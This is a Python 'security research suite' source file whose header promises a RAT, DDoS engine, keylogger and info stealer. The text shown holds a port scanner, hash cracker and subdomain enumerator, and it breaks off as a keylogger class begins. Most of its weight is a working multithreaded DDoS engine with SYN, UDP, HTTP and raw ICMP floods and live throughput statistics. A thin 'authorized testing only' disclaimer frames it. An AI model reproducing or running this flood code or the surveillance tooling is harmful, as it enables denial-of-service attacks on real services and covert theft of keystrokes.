#!/usr/bin/env python3
"""
Multi-Tool v6.0 - Security Research Suite with RAT, DDoS, Keylogger & Info Stealer
For authorized penetration testing, red-team operations, and security research only
"""

import os
import sys
import time
import socket
import threading
import subprocess
import hashlib
import base64
import re
import json
import random
import string
import struct
import io
import queue
import signal
import platform
import sqlite3
import shutil
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.parse import urlparse

# Try importing GUI dependencies for RAT
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox, filedialog
    HAS_TKINTER = True
except ImportError:
    HAS_TKINTER = False

try:
    import PIL.Image
    import PIL.ImageGrab
    import PIL.ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# Try importing keylogger dependencies
try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

# Color codes for CLI mode
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# ============================================
# MODULE 1: Network Scanner
# ============================================
class NetworkScanner:
    @staticmethod
    def scan_ports(target, ports=None):
        if ports is None:
            ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
        open_ports = []
        print(f"{Colors.CYAN}[*] Scanning {target} for {len(ports)} common ports...{Colors.RESET}")
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"{Colors.GREEN}[+] Port {port} open{Colors.RESET}")
                sock.close()
            except:
                pass
        
        threads = []
        for port in ports:
            t = threading.Thread(target=scan_port, args=(port,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return open_ports
    
    @staticmethod
    def ping_sweep(network_prefix):
        alive = []
        print(f"{Colors.CYAN}[*] Ping sweeping {network_prefix}.0/24...{Colors.RESET}")
        for i in range(1, 255):
            ip = f"{network_prefix}.{i}"
            response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
            if response == 0:
                alive.append(ip)
                print(f"{Colors.GREEN}[+] {ip} is alive{Colors.RESET}")
        return alive
    
    @staticmethod
    def dns_lookup(domain):
        try:
            ip = socket.gethostbyname(domain)
            print(f"{Colors.GREEN}[+] {domain} -> {ip}{Colors.RESET}")
            return ip
        except:
            print(f"{Colors.RED}[-] Failed to resolve {domain}{Colors.RESET}")
            return None

# ============================================
# MODULE 2: Hash Cracker
# ============================================
class HashCracker:
    @staticmethod
    def crack_md5(target_hash, wordlist_path="/usr/share/wordlists/rockyou.txt"):
        print(f"{Colors.CYAN}[*] Cracking MD5: {target_hash}{Colors.RESET}")
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    word = line.strip()
                    if hashlib.md5(word.encode()).hexdigest() == target_hash:
                        print(f"{Colors.GREEN}[+] Found: {word}{Colors.RESET}")
                        return word
            print(f"{Colors.RED}[-] Not found in wordlist{Colors.RESET}")
        except FileNotFoundError:
            print(f"{Colors.RED}[-] Wordlist not found: {wordlist_path}{Colors.RESET}")
        return None
    
    @staticmethod
    def crack_sha1(target_hash, wordlist_path="/usr/share/wordlists/rockyou.txt"):
        print(f"{Colors.CYAN}[*] Cracking SHA1: {target_hash}{Colors.RESET}")
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    word = line.strip()
                    if hashlib.sha1(word.encode()).hexdigest() == target_hash:
                        print(f"{Colors.GREEN}[+] Found: {word}{Colors.RESET}")
                        return word
            print(f"{Colors.RED}[-] Not found in wordlist{Colors.RESET}")
        except FileNotFoundError:
            print(f"{Colors.RED}[-] Wordlist not found: {wordlist_path}{Colors.RESET}")
        return None

# ============================================
# MODULE 3: Subdomain Enumerator
# ============================================
class SubdomainEnumerator:
    def __init__(self, domain):
        self.domain = domain
        self.subdomains = []
    
    def load_wordlist(self, wordlist_path=None):
        if wordlist_path and os.path.exists(wordlist_path):
            try:
                with open(wordlist_path, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
            except:
                pass
        return [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1",
            "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap",
            "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn",
            "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx",
            "static", "docs", "beta", "shop", "sql", "secure", "demo", "cp",
            "calendar", "wiki", "web", "media", "email", "images", "img", "download",
            "dns", "stats", "dashboard", "portal", "manage", "start", "info", "apps",
            "video", "sip", "dns2", "api", "cdn", "remote", "server"
        ]
    
    def enumerate(self, wordlist=None):
        if wordlist is None:
            wordlist = self.load_wordlist()
        print(f"{Colors.CYAN}[*] Enumerating subdomains for {self.domain}{Colors.RESET}")
        for sub in wordlist:
            full = f"{sub}.{self.domain}"
            try:
                ip = socket.gethostbyname(full)
                self.subdomains.append(full)
                print(f"{Colors.GREEN}[+] {full} -> {ip}{Colors.RESET}")
            except:
                pass
        return self.subdomains

# ============================================
# MODULE 4: Port Knocker
# ============================================
class PortKnocker:
    @staticmethod
    def knock(target, ports, delay=0.1):
        print(f"{Colors.CYAN}[*] Knocking on {target}: {ports}{Colors.RESET}")
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect_ex((target, port))
                sock.close()
                print(f"{Colors.GREEN}[+] Knocked port {port}{Colors.RESET}")
                time.sleep(delay)
            except:
                print(f"{Colors.RED}[-] Failed to knock port {port}{Colors.RESET}")

# ============================================
# MODULE 5: Password Generator
# ============================================
class PasswordGenerator:
    @staticmethod
    def generate(length=16, use_upper=True, use_lower=True, use_digits=True, use_special=True):
        chars = ""
        if use_lower: chars += string.ascii_lowercase
        if use_upper: chars += string.ascii_uppercase
        if use_digits: chars += string.digits
        if use_special: chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
        if not chars:
            chars = string.ascii_letters + string.digits
        password = ''.join(random.choice(chars) for _ in range(length))
        print(f"{Colors.GREEN}[+] Generated password: {password}{Colors.RESET}")
        return password

# ============================================
# MODULE 6: Base64 Tool
# ============================================
class Base64Tool:
    @staticmethod
    def encode(data):
        encoded = base64.b64encode(data.encode()).decode()
        print(f"{Colors.GREEN}[+] Encoded: {encoded}{Colors.RESET}")
        return encoded
    
    @staticmethod
    def decode(data):
        try:
            decoded = base64.b64decode(data).decode()
            print(f"{Colors.GREEN}[+] Decoded: {decoded}{Colors.RESET}")
            return decoded
        except:
            print(f"{Colors.RED}[-] Invalid base64{Colors.RESET}")
            return None

# ============================================
# MODULE 7: HTTP Headers Fetcher
# ============================================
class HTTPHeaders:
    @staticmethod
    def fetch(url):
        try:
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urlopen(req, timeout=5)
            headers = response.info()
            print(f"{Colors.GREEN}[+] Headers for {url}:{Colors.RESET}")
            for key, value in headers.items():
                print(f"  {Colors.CYAN}{key}{Colors.RESET}: {value}")
            return headers
        except Exception as e:
            print(f"{Colors.RED}[-] Failed: {e}{Colors.RESET}")
            return None

# ============================================
# MODULE 8: DDoS Attack Engine
# ============================================
class DDOSEngine:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': None,
            'errors': 0
        }
        self.lock = threading.Lock()
        self.target_ip = ""
        self.target_port = 0
        self.attack_type = ""
        
    def generate_payload(self, size=1024):
        return os.urandom(size)
    
    def syn_flood_worker(self, target_ip, target_port, duration):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            end_time = time.time() + duration
            
            while self.running and time.time() < end_time:
                try:
                    sock.connect_ex((target_ip, target_port))
                    with self.lock:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += 64
                except:
                    with self.lock:
                        self.stats['errors'] += 1
                time.sleep(0.001)
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
    
    def udp_flood_worker(self, target_ip, target_port, duration, payload_size=1024):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            payload = self.generate_payload(payload_size)
            
            while self.running and time.time() < end_time:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    with self.lock:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += payload_size
                except:
                    with self.lock:
                        self.stats['errors'] += 1
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
    
    def http_flood_worker(self, target_ip, target_port, duration, path="/", user_agents=None):
        if user_agents is None:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
            ]
        
        end_time = time.time() + duration
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                
                ua = random.choice(user_agents)
                request = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
                
                sock.send(request.encode())
                with self.lock:
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(request)
                sock.close()
            except:
                with self.lock:
                    self.stats['errors'] += 1
            time.sleep(0.01)
    
    def icmp_flood_worker(self, target_ip, duration, payload_size=1024):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(0.5)
            end_time = time.time() + duration
            payload = self.generate_payload(payload_size)
            
            icmp_type = 8
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = 0
            
            while self.running and time.time() < end_time:
                try:
                    packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + payload
                    checksum = self.checksum(packet)
                    packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq) + payload
                    
                    sock.sendto(packet, (target_ip, 0))
                    with self.lock:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += len(packet)
                    icmp_seq += 1
                except PermissionError:
                    print(f"{Colors.RED}[-] ICMP flood requires root privileges{Colors.RESET}")
                    break
                except:
                    with self.lock:
                        self.stats['errors'] += 1
                time.sleep(0.001)
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
    
    def checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        words = struct.unpack('!%dH' % (len(data) // 2), data)
        checksum = sum(words)
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += (checksum >> 16)
        return ~checksum & 0xFFFF
    
    def start_attack(self, target_ip, target_port, attack_type, threads=100, duration=60, **kwargs):
        if self.running:
            print(f"{Colors.RED}[-] Attack already running{Colors.RESET}")
            return
        
        self.running = True
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type
        self.stats['packets_sent'] = 0
        self.stats['bytes_sent'] = 0
        self.stats['start_time'] = datetime.now()
        self.stats['errors'] = 0
        
        print(f"{Colors.BOLD}{Colors.RED}")
        print("╔══════════════════════════════════════════════════════════╗")
        print("║                    ATTACK STARTED                       ║")
        print("╚══════════════════════════════════════════════════════════╝")
        print(f"{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Target: {target_ip}:{target_port}")
        print(f"[!] Type: {attack_type.upper()} flood")
        print(f"[!] Threads: {threads}")
        print(f"[!] Duration: {duration}s")
        print(f"[!] Started at: {self.stats['start_time'].strftime('%H:%M:%S')}")
        print(f"{Colors.RESET}\n")
        
        if attack_type == "syn":
            worker = self.syn_flood_worker
            args = (target_ip, target_port, duration)
        elif attack_type == "udp":
            worker = self.udp_flood_worker
            payload_size = kwargs.get('payload_size', 1024)
            args = (target_ip, target_port, duration, payload_size)
        elif attack_type == "http":
            worker = self.http_flood_worker
            path = kwargs.get('path', '/')
            args = (target_ip, target_port, duration, path)
        elif attack_type == "icmp":
            worker = self.icmp_flood_worker
            args = (target_ip, duration)
        else:
            print(f"{Colors.RED}[-] Unknown attack type{Colors.RESET}")
            self.running = False
            return
        
        self.threads = []
        for i in range(threads):
            t = threading.Thread(target=worker, args=args)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        stats_thread = threading.Thread(target=self.display_stats, daemon=True)
        stats_thread.start()
    
    def display_stats(self):
        while self.running:
            time.sleep(2)
            with self.lock:
                elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
                if elapsed > 0:
                    pps = self.stats['packets_sent'] / elapsed
                    bps = self.stats['bytes_sent'] * 8 / elapsed
                    
                    if bps > 1_000_000_000:
                        bw = f"{bps/1_000_000_000:.2f} Gbps"
                    elif bps > 1_000_000:
                        bw = f"{bps/1_000_000:.2f} Mbps"
                    elif bps > 1_000:
                        bw = f"{bps/1_000:.2f} Kbps"
                    else:
                        bw = f"{bps:.2f} bps"
                    
                    print(f"\r{Colors.CYAN}[*] Packets: {self.stats['packets_sent']:,} | "
                          f"Rate: {pps:,.0f} pps | "
                          f"Bandwidth: {bw} | "
                          f"Errors: {self.stats['errors']:,} | "
                          f"Elapsed: {elapsed:.1f}s{Colors.RESET}", end="", flush=True)
    
    def stop_attack(self):
        if not self.running:
            return
        
        self.running = False
        
        for t in self.threads:
            t.join(timeout=1)
        
        elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
        print(f"\n\n{Colors.BOLD}{Colors.GREEN}")
        print("╔══════════════════════════════════════════════════════════╗")
        print("║                    ATTACK STOPPED                       ║")
        print("╚══════════════════════════════════════════════════════════╝")
        print(f"{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Total packets sent: {self.stats['packets_sent']:,}")
        print(f"[+] Total bytes sent: {self.stats['bytes_sent']:,} bytes")
        print(f"[+] Duration: {elapsed:.1f} seconds")
        if elapsed > 0:
            print(f"[+] Average rate: {self.stats['packets_sent']/elapsed:,.0f} pps")
        print(f"[+] Errors: {self.stats['errors']:,}{Colors.RESET}\n")

# ============================================
# MODULE 9: Keylogger
# ============================================
class KeyloggerEngine:
    def __init__(self):
        self.running = False
        self.log_file = None
        self.listener = None
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.log_path = os.path.join(os.getcwd(), "logs")
        
        if not os.path.exists(self.log_path):
            os.makedirs(self.log_path)
    
    def start(self, filename=None):
        if not HAS_PYNPUT:
            print(f"{Colors.RED}[-] pynput not installed. Run: pip install pynput{Colors.RESET}")
            return